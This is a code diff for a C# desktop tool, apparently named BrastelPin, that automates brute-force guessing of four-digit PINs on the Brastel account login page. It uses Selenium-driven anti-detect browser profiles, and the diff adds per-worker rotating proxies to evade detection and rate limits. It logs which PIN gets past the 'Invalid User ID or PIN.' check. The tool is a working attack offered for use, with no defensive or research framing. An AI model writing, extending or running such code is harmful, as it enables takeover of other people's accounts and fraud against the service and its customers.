@@ -20,7 +20,7 @@ namespace BrastelPin
         private const int ELEMENT_WAIT_MS = 5000;
         private const int TYPING_DELAY_MS = 150;
         private const int BACKSPACE_DELAY_MS = 15;
-        
+
         private GUIDataModel _gUIDataModel = null;
         private OmniLoginProfileManager _omniLoginProfileManager;
         private ProxyManager _proxyManager;
@@ -78,11 +78,11 @@ namespace BrastelPin
 
             // Initialize proxy manager
             _proxyManager = new ProxyManager(_gUIDataModel.TMProxyKeys, AddLog);
-            await _proxyManager.InitializeProxiesAsync();
+            _proxyManager.InitializeProxiesAsync();
 
             // Create cancellation token for stopping
             _cancellationTokenSource = new CancellationTokenSource();
-            
+
             ToogleControl(false);
 
             try
@@ -127,13 +127,13 @@ namespace BrastelPin
             btnDeleteAllProfiles.Enabled = enable;
             btnStart.Enabled = enable;
             btnStop.Enabled = !enable;
-            
+
             // Reset stop button text when enabling controls
             if (enable)
             {
                 btnStop.Text = "Stop";
             }
-            
+
             AddLog($"[INFO] Controls {(enable ? "enabled" : "disabled")}");
         }
 
@@ -141,210 +141,260 @@ namespace BrastelPin
         {
             int countCheck1Profile = 0;
             int totalProcessed = 0;
+            ProxyInfo currentProxyInfo = null;
+            System.Threading.Timer proxyRotationTimer = null;
+            DateTime lastProxyRotation = DateTime.Now;
 
             AddLog($"[INFO] Worker thread {workerId} started");
 
-            while (!cancellationToken.IsCancellationRequested)
+            try
             {
-                countCheck1Profile = 0;
-
-                int pin;
-                lock (_queueLock)
+                // Get dedicated API key for this worker
+                string dedicatedApiKey = _proxyManager.GetDedicatedApiKey(workerId);
+                if (string.IsNullOrEmpty(dedicatedApiKey))
                 {
-                    if (_pinQueue.Count == 0)
-                    {
-                        AddLog($"[INFO] Worker {workerId}: PIN queue is empty, ending worker thread");
-                        return;
-                    }
-                    pin = _pinQueue.Dequeue();
-                    AddLog($"[INFO] Worker {workerId}: Remaining PINs in queue: {_pinQueue.Count}");
-                }
-
-                // Check for cancellation before processing PIN
-                if (cancellationToken.IsCancellationRequested)
-                {
-                    AddLog($"[INFO] Worker {workerId}: Cancellation requested, stopping worker thread");
+                    AddLog($"[ERROR] Worker {workerId}: No available API key for this worker");
                     return;
                 }
 
-                string pinStr = pin.ToString("D4");
-                AddLog($"[INFO] Worker {workerId}: Processing PIN: {pinStr}");
-
-                try
+                // Get initial proxy for this worker's dedicated API key
+                currentProxyInfo = await _proxyManager.GetProxyForDedicatedKeyAsync(dedicatedApiKey);
+                if (currentProxyInfo == null)
                 {
-                    // Get an available proxy for this worker
-                    var proxyInfo = _proxyManager.GetAvailableProxy();
-                    if (proxyInfo == null)
-                    {
-                        AddLog($"[ERROR] Worker {workerId}: No available proxy, skipping PIN: {pinStr}");
-                        continue;
-                    }
+                    AddLog($"[ERROR] Worker {workerId}: Failed to get initial proxy for dedicated key");
+                    return;
+                }
 
-                    AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
-                    string profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", proxyInfo.ProxyResponse);
-                    if (string.IsNullOrEmpty(profileId))
-                    {
-                        AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
-                        break;
-                    }
-                    AddLog($"[INFO] Worker {workerId}: Profile created successfully: {profileId}");
+                AddLog($"[INFO] Worker {workerId}: Assigned dedicated API key {dedicatedApiKey.Substring(0, Math.Min(10, dedicatedApiKey.Length))}... with proxy {currentProxyInfo.ProxyResponse.data.https}");
 
-                    AddLog($"[INFO] Worker {workerId}: Starting profile...");
-                    int port = await _omniLoginProfileManager.StartProfileAndGetPortAsync(profileId);
-                    if (port == 0)
+                // Setup proxy rotation timer for 150 seconds
+                proxyRotationTimer = new System.Threading.Timer(async (state) =>
+                {
+                    try
                     {
-                        AddLog($"[ERROR] Worker {workerId}: Failed to start profile");
-                        await CleanupProfile(workerId, profileId);
-                        break;
-                    }
-                    AddLog($"[INFO] Worker {workerId}: Profile running on port: {port}");
-
-                    using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
-                    {
-                        AddLog($"[INFO] Worker {workerId}: Chrome driver initialized with proxy {proxyInfo.ProxyResponse.data.https}");
-                        AddLog($"[INFO] Worker {workerId}: Navigating to Brastel login page");
-                        driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
-                        AddLog($"[INFO] Worker {workerId}: Successfully navigated to login page");
-
-                        try
+                        if (!cancellationToken.IsCancellationRequested)
                         {
-                            AddLog($"[INFO] Worker {workerId}: Attempting login with PIN: {pinStr}");
-                            
-                            // Enter account code
-                            AddLog($"[INFO] Worker {workerId}: Locating account code input field");
-                            var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
-                            
-                            // Clear existing text
-                            for (int i = 0; i < 10; i++)
+                            AddLog($"[INFO] Worker {workerId}: Auto-rotating proxy for dedicated key {dedicatedApiKey.Substring(0, Math.Min(10, dedicatedApiKey.Length))}...");
+                            var newProxyInfo = await _proxyManager.GetProxyForDedicatedKeyAsync(dedicatedApiKey);
+                            if (newProxyInfo != null)
                             {
-                                accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
-                                Thread.Sleep(BACKSPACE_DELAY_MS);
+                                currentProxyInfo = newProxyInfo;
+                                lastProxyRotation = DateTime.Now;
+                                AddLog($"[INFO] Worker {workerId}: Proxy auto-rotated successfully to {currentProxyInfo.ProxyResponse.data.https}");
                             }
-                            
-                            // Enter account code
-                            AddLog($"[INFO] Worker {workerId}: Entering account code: {_gUIDataModel.AccountCode}");
-                            foreach (char c in _gUIDataModel.AccountCode)
-                            {
-                                accCodeInput.SendKeys(c.ToString());
-                                Thread.Sleep(TYPING_DELAY_MS);
-                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        AddLog($"[ERROR] Worker {workerId}: Error during auto proxy rotation: {ex.Message}");
+                    }
+                }, null, TimeSpan.FromSeconds(150), TimeSpan.FromSeconds(150));
 
-                            // Enter PIN
-                            AddLog($"[INFO] Worker {workerId}: Locating PIN input field");
-                            var pinInput = driver.FindElement(By.Id("pinInput"));
+                while (!cancellationToken.IsCancellationRequested)
+                {
+                    countCheck1Profile = 0;
 
-                        CHECK_PIN:
-                            // Clear existing text
-                            for (int i = 0; i < 10; i++)
+                    int pin;
+                    lock (_queueLock)
+                    {
+                        if (_pinQueue.Count == 0)
+                        {
+                            AddLog($"[INFO] Worker {workerId}: PIN queue is empty, ending worker thread");
+                            return;
+                        }
+                        pin = _pinQueue.Dequeue();
+                        AddLog($"[INFO] Worker {workerId}: Remaining PINs in queue: {_pinQueue.Count}");
+                    }
+
+                    // Check for cancellation before processing PIN
+                    if (cancellationToken.IsCancellationRequested)
+                    {
+                        AddLog($"[INFO] Worker {workerId}: Cancellation requested, stopping worker thread");
+                        return;
+                    }
+
+                    string pinStr = pin.ToString("D4");
+                    AddLog($"[INFO] Worker {workerId}: Processing PIN: {pinStr}");
+
+                    try
+                    {
+
+                        AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
+                        string profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", currentProxyInfo.ProxyResponse);
+                        if (string.IsNullOrEmpty(profileId))
+                        {
+                            AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
+                            break;
+                        }
+                        AddLog($"[INFO] Worker {workerId}: Profile created successfully: {profileId}");
+
+                        AddLog($"[INFO] Worker {workerId}: Starting profile...");
+                        int port = await _omniLoginProfileManager.StartProfileAndGetPortAsync(profileId);
+                        if (port == 0)
+                        {
+                            AddLog($"[ERROR] Worker {workerId}: Failed to start profile");
+                            await CleanupProfile(workerId, profileId);
+                            break;
+                        }
+                        AddLog($"[INFO] Worker {workerId}: Profile running on port: {port}");
+
+                        using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
+                        {
+                            AddLog($"[INFO] Worker {workerId}: Chrome driver initialized with proxy {currentProxyInfo.ProxyResponse.data.https}");
+                            AddLog($"[INFO] Worker {workerId}: Navigating to Brastel login page");
+                            driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
+                            AddLog($"[INFO] Worker {workerId}: Successfully navigated to login page");
+
+                            try
                             {
-                                pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
-                                Thread.Sleep(BACKSPACE_DELAY_MS);
-                            }
-                            
-                            // Enter PIN twice (as required by the site)
-                            AddLog($"[INFO] Worker {workerId}: Entering PIN: {pinStr}");
-                            for (int pinEntry = 0; pinEntry < 2; pinEntry++)
-                            {
-                                foreach (char c in pinStr)
+                                AddLog($"[INFO] Worker {workerId}: Attempting login with PIN: {pinStr}");
+
+                                // Enter account code
+                                AddLog($"[INFO] Worker {workerId}: Locating account code input field");
+                                var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
+
+                                // Clear existing text
+                                for (int i = 0; i < 10; i++)
                                 {
-                                    pinInput.SendKeys(c.ToString());
+                                    accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
+                                    Thread.Sleep(BACKSPACE_DELAY_MS);
+                                }
+
+                                // Enter account code
+                                AddLog($"[INFO] Worker {workerId}: Entering account code: {_gUIDataModel.AccountCode}");
+                                foreach (char c in _gUIDataModel.AccountCode)
+                                {
+                                    accCodeInput.SendKeys(c.ToString());
                                     Thread.Sleep(TYPING_DELAY_MS);
                                 }
-                            }
 
-                            // Click sign in button
-                            AddLog($"[INFO] Worker {workerId}: Clicking SIGN IN button");
-                            var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
-                            ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);
+                                // Enter PIN
+                                AddLog($"[INFO] Worker {workerId}: Locating PIN input field");
+                                var pinInput = driver.FindElement(By.Id("pinInput"));
 
-                            AddLog($"[INFO] Worker {workerId}: Waiting for login response...");
-                            Thread.Sleep(ELEMENT_WAIT_MS);
-
-                            // Check for error message
-                            var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
-                            if (findErrorDisplay.Displayed)
-                            {
-                                totalProcessed++;
-                                Invoke(new Action(() =>
+                            CHECK_PIN:
+                                // Clear existing text
+                                for (int i = 0; i < 10; i++)
                                 {
-                                    AddLog($"[CHECKED] Worker {workerId}: PIN {pinStr} is incorrect (Processed: {totalProcessed})");
-                                }));
-                            }
-                            else
-                            {
-                                totalProcessed++;
-                                Invoke(new Action(() =>
-                                {
-                                    AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
-                                }));
+                                    pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
+                                    Thread.Sleep(BACKSPACE_DELAY_MS);
+                                }
 
-                                await CleanupProfile(workerId, profileId);
-                                break;
-                            }
-
-                            countCheck1Profile++;
-                            AddLog($"[INFO] Worker {workerId}: Profile usage count: {countCheck1Profile}/{MAX_CHECKS_PER_PROFILE}");
-                            
-                            if (countCheck1Profile < MAX_CHECKS_PER_PROFILE)
-                            {
-                                bool isEmptyQueue = false;
-                                lock (_queueLock)
+                                // Enter PIN twice (as required by the site)
+                                AddLog($"[INFO] Worker {workerId}: Entering PIN: {pinStr}");
+                                for (int pinEntry = 0; pinEntry < 2; pinEntry++)
                                 {
-                                    if (_pinQueue.Count == 0)
+                                    foreach (char c in pinStr)
                                     {
-                                        isEmptyQueue = true;
-                                    }
-                                    else
-                                    {
-                                        pin = _pinQueue.Dequeue();
+                                        pinInput.SendKeys(c.ToString());
+                                        Thread.Sleep(TYPING_DELAY_MS);
                                     }
                                 }
-                                
-                                if (isEmptyQueue)
+
+                                // Click sign in button
+                                AddLog($"[INFO] Worker {workerId}: Clicking SIGN IN button");
+                                var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
+                                ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);
+
+                                AddLog($"[INFO] Worker {workerId}: Waiting for login response...");
+                                Thread.Sleep(ELEMENT_WAIT_MS);
+
+                                // Check for error message
+                                var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
+                                if (findErrorDisplay.Displayed)
                                 {
-                                    AddLog($"[INFO] Worker {workerId}: Queue is empty, cleaning up profile");
-                                    await CleanupProfile(workerId, profileId);
-                                    break;
+                                    totalProcessed++;
+                                    Invoke(new Action(() =>
+                                    {
+                                        AddLog($"[CHECKED] Worker {workerId}: PIN {pinStr} is incorrect (Processed: {totalProcessed})");
+                                    }));
                                 }
                                 else
                                 {
-                                    pinStr = pin.ToString("D4");
-                                    AddLog($"[INFO] Worker {workerId}: Reusing profile for next PIN: {pinStr}");
-                                    goto CHECK_PIN;
-                                }
-                            }
-                            else
-                            {
-                                AddLog($"[INFO] Worker {workerId}: Maximum profile usage reached, cleaning up");
-                            }
+                                    totalProcessed++;
+                                    Invoke(new Action(() =>
+                                    {
+                                        AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
+                                    }));
 
-                            await CleanupProfile(workerId, profileId);
-                        }
-                        catch (NoSuchElementException ex)
-                        {
-                            AddLog($"[ERROR] Worker {workerId}: Element not found: {ex.Message}");
-                            await CleanupProfile(workerId, profileId);
-                            break;
-                        }
-                        catch (WebDriverException ex)
-                        {
-                            AddLog($"[ERROR] Worker {workerId}: WebDriver error: {ex.Message}");
-                            await CleanupProfile(workerId, profileId);
-                            break;
-                        }
-                        finally
-                        {
-                            // Proxy is embedded in profile, no need to return it
-                            AddLog($"[INFO] Worker {workerId}: Chrome driver session completed");
+                                    await CleanupProfile(workerId, profileId);
+                                    break;
+                                }
+
+                                countCheck1Profile++;
+                                AddLog($"[INFO] Worker {workerId}: Profile usage count: {countCheck1Profile}/{MAX_CHECKS_PER_PROFILE}");
+
+                                if (countCheck1Profile < MAX_CHECKS_PER_PROFILE)
+                                {
+                                    bool isEmptyQueue = false;
+                                    lock (_queueLock)
+                                    {
+                                        if (_pinQueue.Count == 0)
+                                        {
+                                            isEmptyQueue = true;
+                                        }
+                                        else
+                                        {
+                                            pin = _pinQueue.Dequeue();
+                                        }
+                                    }
+
+                                    if (isEmptyQueue)
+                                    {
+                                        AddLog($"[INFO] Worker {workerId}: Queue is empty, cleaning up profile");
+                                        await CleanupProfile(workerId, profileId);
+                                        break;
+                                    }
+                                    else
+                                    {
+                                        pinStr = pin.ToString("D4");
+                                        AddLog($"[INFO] Worker {workerId}: Reusing profile for next PIN: {pinStr}");
+                                        goto CHECK_PIN;
+                                    }
+                                }
+                                else
+                                {
+                                    AddLog($"[INFO] Worker {workerId}: Maximum profile usage reached, cleaning up");
+                                }
+
+                                await CleanupProfile(workerId, profileId);
+                            }
+                            catch (NoSuchElementException ex)
+                            {
+                                AddLog($"[ERROR] Worker {workerId}: Element not found: {ex.Message}");
+                                await CleanupProfile(workerId, profileId);
+                                break;
+                            }
+                            catch (WebDriverException ex)
+                            {
+                                AddLog($"[ERROR] Worker {workerId}: WebDriver error: {ex.Message}");
+                                await CleanupProfile(workerId, profileId);
+                                break;
+                            }
+                            finally
+                            {
+                                // Proxy is embedded in profile, no need to return it
+                                AddLog($"[INFO] Worker {workerId}: Chrome driver session completed");
+                            }
                         }
                     }
-                }
-                catch (Exception ex)
-                {
-                    Invoke(new Action(() =>
+                    catch (Exception ex)
                     {
-                        AddLog($"[ERROR] Worker {workerId}: Unexpected error: {ex.Message}");
-                    }));
+                        Invoke(new Action(() =>
+                        {
+                            AddLog($"[ERROR] Worker {workerId}: Unexpected error: {ex.Message}");
+                        }));
+                    }
+                }
+            }
+            finally
+            {
+                // Cleanup timer and release API key
+                proxyRotationTimer?.Dispose();
+                if (!string.IsNullOrEmpty(currentProxyInfo?.ApiKey))
+                {
+                    _proxyManager.ReleaseDedicatedApiKey(workerId);
+                    AddLog($"[INFO] Worker {workerId}: Released dedicated API key and cleaned up resources");
                 }
             }
         }
@@ -355,10 +405,10 @@ namespace BrastelPin
             {
                 AddLog($"[INFO] Worker {workerId}: Stopping profile: {profileId}");
                 await _omniLoginProfileManager.StopProfileAsync(profileId);
-                
+
                 AddLog($"[INFO] Worker {workerId}: Deleting profile: {profileId}");
                 await _omniLoginProfileManager.DeleteProfileAsync(profileId);
-                
+
                 AddLog($"[INFO] Worker {workerId}: Profile cleanup completed: {profileId}");
             }
             catch (Exception ex)
@@ -370,13 +420,13 @@ namespace BrastelPin
         private void MainForm_Load(object sender, EventArgs e)
         {
             AddLog("[INFO] Application starting up...");
-            
+
             _gUIDataModel = GUIDataModel.LoadFromFile();
             AddLog("[INFO] Configuration loaded from file");
-            
+
             _omniLoginProfileManager = new OmniLoginProfileManager(_gUIDataModel.OmniloginURL, AddLog);
             AddLog($"[INFO] OmniLogin manager initialized with URL: {_gUIDataModel.OmniloginURL}");
-            
+
             // Load UI values
             txtAccountCode.Text = _gUIDataModel.AccountCode;
             txtPinFrom.Text = _gUIDataModel.PinFrom.ToString();
@@ -392,7 +442,7 @@ namespace BrastelPin
             txtPinTo.TextChanged += new EventHandler(TextBoxTextChanged);
             txtOmniloginURL.TextChanged += new EventHandler(TextBoxTextChanged);
             txtConcurrentProfiles.TextChanged += new EventHandler(TextBoxTextChanged);
-            
+
             AddLog("[INFO] Application initialized successfully");
         }
 
@@ -413,7 +463,7 @@ namespace BrastelPin
                 _gUIDataModel.OmniloginURL = txtOmniloginURL.Text;
                 _gUIDataModel.ConcurrentProfiles = int.Parse(txtConcurrentProfiles.Text);
                 _gUIDataModel.SaveToFile();
-                
+
                 AddLog("[INFO] Configuration updated and saved");
             }
             catch (Exception ex)
@@ -492,16 +542,16 @@ namespace BrastelPin
         private void btnStop_Click(object sender, EventArgs e)
         {
             AddLog("[INFO] Stop button clicked - requesting cancellation...");
-            
+
             if (_cancellationTokenSource != null && !_cancellationTokenSource.Token.IsCancellationRequested)
             {
                 _cancellationTokenSource.Cancel();
                 AddLog("[INFO] Cancellation request sent to all worker threads");
-                
+
                 // Disable stop button to prevent multiple clicks
                 btnStop.Enabled = false;
                 btnStop.Text = "Stopping...";
-                
+
                 AddLog("[INFO] Please wait while the current operations complete...");
             }
             else
@@ -514,7 +564,7 @@ namespace BrastelPin
         {
             rtbLog.Clear();
             AddLog("[INFO] Starting to delete all profiles...");
-            
+
             bool enableControl = false;
             txtAccountCode.Enabled = enableControl;
             txtPinFrom.Enabled = enableControl;
@@ -553,7 +603,7 @@ namespace BrastelPin
             btnDeleteAllProfiles.Enabled = enableControl;
             btnStart.Enabled = enableControl;
             btnStop.Enabled = enableControl;
-            
+
             AddLog("[INFO] All controls re-enabled");
         }
     }
@@ -562,13 +612,12 @@ namespace BrastelPin
     public class ProxyManager : IDisposable
     {
         // Constants
-        private const int PROXY_EXPIRATION_SECONDS = 150;
         private const int PROXY_RETRY_DELAY_MS = 30000; // 30 seconds retry delay
-        
+
         private readonly List<string> _proxyKeys;
         private readonly Action<string> _logAction;
         private readonly ConcurrentDictionary<string, ProxyInfo> _proxyPool;
-        private readonly System.Threading.Timer _rotationTimer;
+        private readonly ConcurrentDictionary<int, string> _workerApiKeys; // workerId -> apiKey mapping
         private readonly object _lock = new object();
         private bool _disposed = false;
         private int _currentKeyIndex = 0;
@@ -578,138 +627,100 @@ namespace BrastelPin
             _proxyKeys = proxyKeys ?? throw new ArgumentNullException(nameof(proxyKeys));
             _logAction = logAction ?? throw new ArgumentNullException(nameof(logAction));
             _proxyPool = new ConcurrentDictionary<string, ProxyInfo>();
-            
-            // Setup rotation timer for 150 seconds
-            _rotationTimer = new System.Threading.Timer(RotateProxies, null, TimeSpan.FromSeconds(PROXY_EXPIRATION_SECONDS), TimeSpan.FromSeconds(PROXY_EXPIRATION_SECONDS));
+            _workerApiKeys = new ConcurrentDictionary<int, string>();
         }
 
-        public async Task InitializeProxiesAsync()
+        public void InitializeProxiesAsync()
         {
-            _logAction("[INFO] Initializing proxy manager with rotation...");
-            await RotateProxiesAsync();
+            _logAction("[INFO] Initializing proxy manager...");
+            // No need to initialize all proxies upfront since each worker will get its own
+            _logAction($"[INFO] Proxy manager initialized with {_proxyKeys.Count} API keys available");
         }
 
-        private void RotateProxies(object state)
-        {
-            // Use Task.Run to handle async operations in timer callback
-            Task.Run(async () => await RotateProxiesAsync());
-        }
-
-        private async Task RotateProxiesAsync()
-        {
-            _logAction("[INFO] Rotating proxies - getting fresh proxy endpoints...");
-            
-            var newProxyPool = new ConcurrentDictionary<string, ProxyInfo>();
-            
-            foreach (string proxyKey in _proxyKeys)
-            {
-                ProxyResponse proxyResponse = null;
-                int retryCount = 0;
-                
-                // Keep trying until we get a proxy or reach max retries
-                while (proxyResponse == null)
-                {
-                    try
-                    {
-                        retryCount++;
-                        _logAction($"[INFO] Getting proxy for key {proxyKey.Substring(0, Math.Min(10, proxyKey.Length))}... (Attempt {retryCount})");
-                        
-                        proxyResponse = await GetProxyAsync(proxyKey);
-                        
-                        if (proxyResponse != null)
-                        {
-                            var proxyInfo = new ProxyInfo
-                            {
-                                ApiKey = proxyKey,
-                                ProxyResponse = proxyResponse
-                            };
-                            newProxyPool.TryAdd(proxyKey, proxyInfo);
-                            _logAction($"[INFO] Proxy rotated for key {proxyKey.Substring(0, Math.Min(10, proxyKey.Length))}...: {proxyResponse.data.https}");
-                            break; // Success, exit retry loop
-                        }
-                        else
-                        {
-                            _logAction($"[WARNING] Failed to get proxy for key {proxyKey.Substring(0, Math.Min(10, proxyKey.Length))}... (Attempt {retryCount}). Retrying in {PROXY_RETRY_DELAY_MS}ms...");
-                            await Task.Delay(PROXY_RETRY_DELAY_MS);
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        _logAction($"[ERROR] Exception getting proxy for key {proxyKey.Substring(0, Math.Min(10, proxyKey.Length))}... (Attempt {retryCount}): {ex.Message}. Retrying in {PROXY_RETRY_DELAY_MS}ms...");
-                        await Task.Delay(PROXY_RETRY_DELAY_MS);
-                    }
-                }
-            }
-            
-            // Replace the old proxy pool with the new one
-            _proxyPool.Clear();
-            foreach (var kvp in newProxyPool)
-            {
-                _proxyPool.TryAdd(kvp.Key, kvp.Value);
-            }
-            
-            _logAction($"[INFO] Proxy rotation completed. Active proxies: {_proxyPool.Count}");
-        }
-
-        public ProxyInfo GetAvailableProxy()
+        // Get dedicated API key for a specific worker
+        public string GetDedicatedApiKey(int workerId)
         {
             lock (_lock)
             {
-                if (_proxyPool.Count == 0)
+                // Check if worker already has an assigned key
+                if (_workerApiKeys.TryGetValue(workerId, out string existingKey))
                 {
-                    _logAction("[CRITICAL] No available proxies in pool - stopping application!");
-                    
-                    // Stop the application gracefully
-                    Task.Run(() =>
-                    {
-                        if (System.Windows.Forms.Application.OpenForms.Count > 0)
-                        {
-                            var mainForm = System.Windows.Forms.Application.OpenForms[0];
-                            mainForm.Invoke(new Action(() =>
-                            {
-                                _logAction("[CRITICAL] Application will be terminated due to lack of available proxies.");
-                                MessageBox.Show("No available proxies found. The application will be terminated.", 
-                                               "Critical Error", 
-                                               MessageBoxButtons.OK, 
-                                               MessageBoxIcon.Error);
-                                System.Windows.Forms.Application.Exit();
-                            }));
-                        }
-                    });
-                    
-                    return null;
+                    return existingKey;
                 }
 
-                // Round-robin selection
-                var proxyKeys = _proxyPool.Keys.ToList();
-                if (_currentKeyIndex >= proxyKeys.Count)
-                    _currentKeyIndex = 0;
+                // Find an available API key (not assigned to any worker)
+                var assignedKeys = _workerApiKeys.Values.ToHashSet();
+                var availableKey = _proxyKeys.FirstOrDefault(key => !assignedKeys.Contains(key));
 
-                var selectedKey = proxyKeys[_currentKeyIndex];
-                _currentKeyIndex++;
-
-                if (_proxyPool.TryGetValue(selectedKey, out ProxyInfo proxy))
+                if (availableKey != null)
                 {
-                    _logAction($"[INFO] Assigned proxy: {proxy.ProxyResponse.data.https}");
-                    return proxy;
+                    _workerApiKeys.TryAdd(workerId, availableKey);
+                    _logAction($"[INFO] Assigned dedicated API key {availableKey.Substring(0, Math.Min(10, availableKey.Length))}... to worker {workerId}");
+                    return availableKey;
                 }
 
-                _logAction("[WARNING] Failed to get proxy from pool");
+                _logAction($"[ERROR] No available API key for worker {workerId}. Total keys: {_proxyKeys.Count}, Assigned: {assignedKeys.Count}");
                 return null;
             }
         }
 
-        public ProxyInfo GetProxyForKey(string apiKey)
+        // Release dedicated API key when worker finishes
+        public void ReleaseDedicatedApiKey(int workerId)
         {
-            if (_proxyPool.TryGetValue(apiKey, out ProxyInfo proxy))
+            if (_workerApiKeys.TryRemove(workerId, out string apiKey))
             {
-                _logAction($"[INFO] Retrieved proxy for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}...: {proxy.ProxyResponse.data.https}");
-                return proxy;
+                // Also remove from proxy pool
+                _proxyPool.TryRemove(apiKey, out _);
+                _logAction($"[INFO] Released API key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... from worker {workerId}");
+            }
+        }
+
+        // Get proxy for a dedicated API key
+        public async Task<ProxyInfo> GetProxyForDedicatedKeyAsync(string apiKey)
+        {
+            ProxyResponse proxyResponse = null;
+            int retryCount = 0;
+
+            // Keep trying until we get a proxy or reach max retries
+            while (proxyResponse == null)
+            {
+                try
+                {
+                    retryCount++;
+                    _logAction($"[INFO] Getting proxy for dedicated key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... (Attempt {retryCount})");
+
+                    proxyResponse = await GetProxyAsync(apiKey);
+
+                    if (proxyResponse != null)
+                    {
+                        var proxyInfo = new ProxyInfo
+                        {
+                            ApiKey = apiKey,
+                            ProxyResponse = proxyResponse
+                        };
+
+                        // Update the proxy in pool
+                        _proxyPool.AddOrUpdate(apiKey, proxyInfo, (key, oldValue) => proxyInfo);
+                        _logAction($"[INFO] Proxy obtained successfully for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}...: {proxyResponse.data.https}");
+                        return proxyInfo;
+                    }
+                    else
+                    {
+                        _logAction($"[WARNING] Failed to get proxy for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... (Attempt {retryCount}). Retrying in {PROXY_RETRY_DELAY_MS}ms...");
+                        await Task.Delay(PROXY_RETRY_DELAY_MS);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    _logAction($"[ERROR] Exception getting proxy for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... (Attempt {retryCount}): {ex.Message}. Retrying in {PROXY_RETRY_DELAY_MS}ms...");
+                    await Task.Delay(PROXY_RETRY_DELAY_MS);
+                }
             }
 
-            _logAction($"[WARNING] No proxy found for key: {apiKey.Substring(0, Math.Min(10, apiKey.Length))}...");
-            return null;
+            return null; // Should never reach here due to infinite retry loop
         }
+
+
 
         private async Task<ProxyResponse> GetProxyAsync(string apiKey)
         {
@@ -754,8 +765,8 @@ namespace BrastelPin
             if (!_disposed)
             {
                 _logAction("[INFO] Disposing proxy manager");
-                _rotationTimer?.Dispose();
                 _proxyPool.Clear();
+                _workerApiKeys.Clear();
                 _disposed = true;
             }
         }
